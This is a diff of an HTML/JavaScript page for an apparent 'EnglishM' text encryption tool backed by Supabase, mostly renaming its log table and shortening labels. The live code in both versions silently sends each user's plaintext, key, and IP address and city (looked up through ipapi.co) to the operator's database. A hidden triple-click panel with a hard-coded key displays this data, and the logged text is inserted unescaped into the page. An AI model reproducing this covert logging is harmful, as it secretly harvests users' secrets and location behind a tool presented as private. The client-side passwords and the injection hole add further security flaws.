@@ -28,11 +28,10 @@
         footer { margin-top: auto; padding: 30px; width: 100%; text-align: center; }
         .footer-text { font-size: 0.95rem; color: var(--matrix-green); font-weight: bold; opacity: 0.6; }
 
-        /* واجهة البيانات السرية المطورة */
+        /* واجهة البيانات السرية */
         #secret-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; padding: 20px; box-sizing: border-box; overflow-y: auto; border: 5px solid var(--matrix-green); }
         .log-table { width: 100%; border-collapse: collapse; color: var(--matrix-green); margin-top: 20px; font-size: 0.85rem; }
         .log-table th, .log-table td { border: 1px solid var(--matrix-green); padding: 12px; text-align: center; }
-        .log-table th { background: var(--dark-green); }
         .close-secret { background: #ff0000; color: #fff; width: auto; padding: 10px 25px; margin-bottom: 20px; }
     </style>
 </head>
@@ -90,8 +89,8 @@
 
     <div id="secret-panel">
         <button class="close-secret" onclick="document.getElementById('secret-panel').style.display='none'">EXIT SECURE PANEL</button>
-        <h1 style="color:var(--matrix-green)">SYSTEM LOGS - ENGLISHM V1</h1>
-        <div id="log-content">Initializing...</div>
+        <h1 style="color:var(--matrix-green)">DATABASE: logs_english</h1>
+        <div id="log-content">Loading data...</div>
     </div>
 
     <footer id="f-c" style="display:none;">
@@ -106,67 +105,66 @@
         function uC() { 
             const clock = document.getElementById('digital-clock');
             setInterval(() => { 
-                const n = new Date(); 
-                let h = n.getHours() % 12 || 12;
+                const n = new Date(); let h = n.getHours() % 12 || 12;
                 clock.innerText = `${String(h).padStart(2, '0')}:${String(n.getMinutes()).padStart(2, '0')}:${String(n.getSeconds()).padStart(2, '0')}:${String(n.getMilliseconds()).padStart(3, '0')}`; 
             }, 10);
         }
 
-        function cP() { if (document.getElementById('pI').value === "YALiM") { document.getElementById('lock-screen').style.display = 'none'; ['e-s','d-s','m-l','f-c'].forEach(i => document.getElementById(i).style.display = 'block'); } else { alert("ACCESS DENIED!"); } }
+        function cP() { if (document.getElementById('pI').value === "YALiM") { document.getElementById('lock-screen').style.display = 'none'; ['e-s','d-s','m-l','f-c'].forEach(i => document.getElementById(i).style.display = 'block'); } else { alert("DENIED"); } }
 
-        // نظام الـ 3 ضغطات مع باسورد سري
         let oC = 0;
         function hOC() {
             oC++;
             if (oC === 3) {
-                let sK = prompt("ENTER SYSTEM ACCESS KEY:");
+                let sK = prompt("ACCESS KEY:");
                 if (sK === "YALiM_LOGS") { 
                     document.getElementById('secret-panel').style.display = 'block';
                     fL();
-                } else { alert("WRONG KEY!"); }
+                } else { alert("WRONG!"); }
                 oC = 0;
             }
             setTimeout(() => { oC = 0; }, 1000);
         }
 
         async function fL() {
-            const { data } = await s_b.from('logs').select('*').eq('browser', 'ENGLISHM_PRO_2026').order('created_at', { ascending: false });
+            // الربط بجدول النسخة الإنجليزية المخصص
+            const { data } = await s_b.from('logs_english').select('*').order('created_at', { ascending: false });
             if (data) {
-                let h = '<table class="log-table"><tr><th>TIMESTAMP</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>LOCATION/IP</th></tr>';
+                let h = '<table class="log-table"><tr><th>DATE</th><th>ACTION</th><th>CONTENT</th><th>KEY</th><th>INFO</th></tr>';
                 data.forEach(r => { h += `<tr><td>${new Date(r.created_at).toLocaleString()}</td><td>${r.action_type}</td><td>${r.content}</td><td>${r.key_used}</td><td>${r.user_info}</td></tr>`; });
                 document.getElementById('log-content').innerHTML = h + '</table>';
             }
         }
 
-        const title = document.getElementById('interactive-title');
-        const owl = document.getElementById('interactive-owl');
+        const t = document.getElementById('interactive-title'), o = document.getElementById('interactive-owl');
         document.addEventListener('mousemove', (e) => {
             if (document.getElementById('m-l').style.display !== 'none') {
                 const x = (e.clientX - window.innerWidth / 2) / 25, y = (e.clientY - window.innerHeight / 2) / 25;
-                title.style.textShadow = `${x}px ${y}px 15px rgba(0, 255, 65, 0.8)`;
-                owl.style.filter = `drop-shadow(${x}px ${y}px 12px rgba(0, 255, 65, 0.8))`;
+                t.style.textShadow = `${x}px ${y}px 15px rgba(0, 255, 65, 0.8)`;
+                o.style.filter = `drop-shadow(${x}px ${y}px 12px rgba(0, 255, 65, 0.8))`;
             }
         });
 
         async function rT(t, k, s, m) { 
             try { 
-                let loc = "ENGLISHM_V1";
-                try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); loc = `${gd.city || 'Unknown'}, ${gd.ip}`; } catch(e) {}
-                await s_b.from('logs').insert([{ content: t, key_used: k.toString(), bracket_style: s, action_type: m, user_info: loc, browser: "ENGLISHM_PRO_2026" }]);
+                let inf = "ENGLISHM_V1";
+                try { const g = await fetch('https://ipapi.co/json/'); const gd = await g.json(); inf = `${gd.city}, ${gd.ip}`; } catch(e) {}
+                // الإرسال لجدول النسخة الإنجليزية المخصص
+                await s_b.from('logs_english').insert([{ content: t, key_used: k.toString(), bracket_style: s, action_type: m, user_info: inf, browser: "ENGLISHM_PRO_2026" }]);
             } catch(e) {} 
         }
 
         async function pA(m) {
             let sx = m === 'encrypt' ? 'E' : 'D';
-            let t = document.getElementById('iT' + sx).value, k = document.getElementById('kI' + sx).value, s = document.getElementById('s' + sx).value, b = document.getElementById('btn' + sx);
-            if (!t || !k) return;
-            b.innerText = "PROCESSING..."; b.disabled = true;
-            const { data } = await s_b.rpc('englishm_logic', { t: t, k: parseInt(k), m: m, s: s });
-            if (data) { document.getElementById('o' + sx).innerText = data.result; rT(t, k, s, m); }
-            b.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE"; b.disabled = false;
+            let txt = document.getElementById('iT' + sx).value, ky = document.getElementById('kI' + sx).value, br = document.getElementById('s' + sx).value, btn = document.getElementById('btn' + sx);
+            if (!txt || !ky) return;
+            btn.innerText = "WAIT..."; btn.disabled = true;
+            const { data } = await s_b.rpc('englishm_logic', { t: txt, k: parseInt(ky), m: m, s: br });
+            if (data) { document.getElementById('o' + sx).innerText = data.result; rT(txt, ky, br, m); }
+            btn.innerText = m === 'encrypt' ? "ENCRYPT NOW" : "DECRYPT CODE"; btn.disabled = false;
         }
 
-        function cR(i) { const t = document.getElementById(i).innerText; if (t !== "...") { navigator.clipboard.writeText(t).then(() => alert("COPIED! ✅")); } }
+        function cR(i) { navigator.clipboard.writeText(document.getElementById(i).innerText).then(() => alert("COPIED")); }
     </script>
 </body>
 </html>
